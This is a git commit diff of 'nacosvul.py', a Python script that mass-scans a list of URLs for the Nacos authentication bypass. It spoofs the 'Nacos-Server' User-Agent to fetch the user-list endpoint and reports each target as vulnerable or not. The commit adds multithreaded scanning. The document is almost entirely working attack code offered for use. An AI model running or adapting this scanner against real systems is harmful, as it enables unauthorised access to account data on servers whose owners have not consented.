b4119e22a57658c9299393dac1934be74dde405e
pizz33 <88339946+Pizz33@users.noreply.github.com>
2023-03-22 15:41:43 +0800

    Update nacosvul.py

--- nacosvul.py
+++ nacosvul.py
@@ -1,10 +1,11 @@
 import requests
 import urllib3
+import threading
+
 urllib3.disable_warnings()
 
 # 定义自定义路径和Header
 custom_path = '/nacos/v1/auth/users?pageNo=1&pageSize=2'
-#proxies = {'http': 'http://127.0.0.1:8080'}
 header = {
     "User-Agent": "Nacos-Server",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -20,21 +21,22 @@ header = {
     "Te": "trailers",
     "Cache-Control": "no-cache",
 }
-# 从url.txt文件中读取URL列表
-with open('url.txt', 'r') as f:
-    urls = f.read().splitlines()
 
-# 循环发送GET请求并判断回显结果
-for url in urls:
+# 定义函数，用于发起GET请求并判断回显结果，每次调用这个函数发送一个请求
+def send_request(url):
     full_url = url + custom_path  # 拼接完整URL
     try:
-        response = requests.get(full_url, headers=header,verify=False,timeout=2)
+        response = requests.get(full_url, headers=header, verify=False, timeout=2)
         if response.status_code == 200 and response.content.find(b"pageNumber") != -1:
             print(f'{url} 存在nacos身份验证绕过漏洞')
         else:
             print(f'{url} 不存在nacos身份验证绕过漏洞')
     except requests.exceptions.RequestException as e:
         print(f'{url} 访问失败 {e}')
+
+# 从url.txt文件中读取URL列表
+with open('url.txt', 'r') as f:
+    urls = f.read().splitlines()
 
 threads = []
 for url in urls:
